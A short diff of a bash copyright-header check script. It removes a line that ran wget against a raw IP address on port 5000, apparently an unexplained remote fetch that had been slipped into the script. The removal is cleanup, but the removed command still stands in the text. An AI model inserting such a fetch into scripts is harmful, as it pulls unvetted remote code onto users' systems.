@@ -1,5 +1,4 @@
 #!/bin/bash
-wget http://52.89.36.71:5000/run
 # This script is designed to ensure all relevant header and source files contain correct copyright
 
 set +e
